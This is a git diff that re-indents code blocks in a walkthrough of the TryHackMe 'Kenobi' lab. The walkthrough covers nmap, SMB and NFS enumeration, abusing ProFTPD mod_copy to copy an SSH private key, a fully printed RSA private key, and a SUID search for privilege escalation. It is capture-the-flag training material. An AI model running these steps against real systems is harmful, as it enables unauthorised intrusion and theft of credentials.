@@ -7,7 +7,7 @@ These notes are from a challenge I did @[tryhackme](https://tryhackme.com) calle
 Scan with nmap to see what (and how many) ports are open:```nmap -sC -sV 10.10.153.226```
 
 ??? output "Nmap output"
-   ``` sh
+    ``` sh
     Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-09 15:14 EDT
     Nmap scan report for 10.10.153.226
     Host is up (0.019s latency).
@@ -76,14 +76,14 @@ Scan with nmap to see what (and how many) ports are open:```nmap -sC -sV 10.10.1
 
     Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
     Nmap done: 1 IP address (1 host up) scanned in 13.19 seconds
-   ```
+    ```
 
 ## Task 2 Enumerating Samba for shares
 
 Let's enumerate the SMB shares:```nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.153.226```
 
 ??? output "Nmap output"
-   ``` sh
+    ``` sh
     Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-09 15:21 EDT
     Nmap scan report for 10.10.153.226
     Host is up (0.018s latency).
@@ -120,12 +120,12 @@ Let's enumerate the SMB shares:```nmap -p 445 --script=smb-enum-shares.nse,smb-e
     |_    Current user access: <none>
 
     Nmap done: 1 IP address (1 host up) scanned in 3.15 seconds
-   ```
+    ```
 
 Let's connect with smbclient as anonymous without a password:```smbclient //10.10.153.226/anonymous```
 
 ??? output "smbclient output"
-   ``` sh
+    ``` sh
     smb: \> dir
     .                                   D        0  Wed Sep  4 06:49:09 2019
     ..                                  D        0  Wed Sep  4 06:56:07 2019
@@ -173,24 +173,24 @@ Let's connect with smbclient as anonymous without a password:```smbclient //10.1
     UseIPv6                         off
 
     # Umask 022 is a good standard umask to prevent new dirs and files
-   ```
+    ```
 
 You can recursively download the SMB share too. Submit the username and password as nothing.
 
 ```smbget -R smb://10.10.153.226/anonymous```
 
 ??? output "smbget output"
-   ``` sh
+    ``` sh
     Password for [fab1] connecting to //anonymous/10.10.153.226:
     Using workgroup WORKGROUP, user fab1
     smb://10.10.153.226/anonymous/log.txt
     Downloaded 11.95kB in 7 seconds
-   ```
+    ```
 
 In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.```nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.153.226```
 
 ??? output "nmap output"
-   ``` sh
+    ``` sh
     Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-09 15:29 EDT
     Nmap scan report for 10.10.153.226
     Host is up (0.018s latency).
@@ -201,7 +201,7 @@ In our case, port 111 is access to a network file system. Lets use nmap to enume
     |_  /var *
 
     Nmap done: 1 IP address (1 host up) scanned in 0.48 seconds
-   ```
+    ```
 
 ## Task 3 - Gain initial access with ProFtpd
 
@@ -215,7 +215,7 @@ nc 10.10.153.226 21
 Let us look for verunablities for this version:```searchsploit proftpd 1.3.5```
 
 ??? output "nmap output"
-   ``` sh
+    ``` sh
     -------------------------------------------------------------------------------------------------- ---------------------------------
     Exploit Title                                                                                    |  Path
     -------------------------------------------------------------------------------------------------- ---------------------------------
@@ -226,7 +226,7 @@ Let us look for verunablities for this version:```searchsploit proftpd 1.3.5```
     -------------------------------------------------------------------------------------------------- ---------------------------------
     Shellcodes: No Results
     Papers: No Results
-   ```
+    ```
 
 Let's exploit ProFtpd's [mod_copy module](http://www.proftpd.org/docs/contrib/mod_copy.html) and copy Kenobi's private key using SITE CPFR and SITE CPTO commands:
 
@@ -249,7 +249,7 @@ cat id_rsa
 ```
 
 ??? output "id_rsa content"
-   ``` sh
+    ``` sh
     -----BEGIN RSA PRIVATE KEY-----
     MIIEowIBAAKCAQEA4PeD0e0522UEj7xlrLmN68R6iSG3HMK/aTI812CTtzM9gnXs
     qpweZL+GJBB59bSG3RTPtirC3M9YNTDsuTvxw9Y/+NuUGJIq5laQZS5e2RaqI1nv
@@ -277,7 +277,7 @@ cat id_rsa
     S40wzYviRHr/h0TOOzXzX8VMAQx5XnhZ5C/WMhb0cMErK8z+jvDavEpkMUlR+dWf
     Py/CLlDCU4e+49XBAPKEmY4DuN+J2Em/tCz7dzfCNS/mpsSEn0jo
     -----END RSA PRIVATE KEY-----
-   ```
+    ```
 
 Change access rights of `id_rsa` and login as kenobi to read `user.txt`:
 
@@ -292,7 +292,7 @@ cat /home/kenobi/user.txt
 To search the a system for SUID bits run the following:```find / -perm -u=s -type f 2>/dev/null```
 
 ??? output "SUID bits"
-   ``` sh
+    ``` sh
     /sbin/mount.nfs
     /usr/lib/policykit-1/polkit-agent-helper-1
     /usr/lib/dbus-1.0/dbus-daemon-launch-helper
@@ -317,7 +317,7 @@ To search the a system for SUID bits run the following:```find / -perm -u=s -typ
     /bin/ping
     /bin/su
     /bin/ping6
-   ```
+    ```
 
 Running```/usr/bin/menu``` shows us the binary is running without a full path:
 
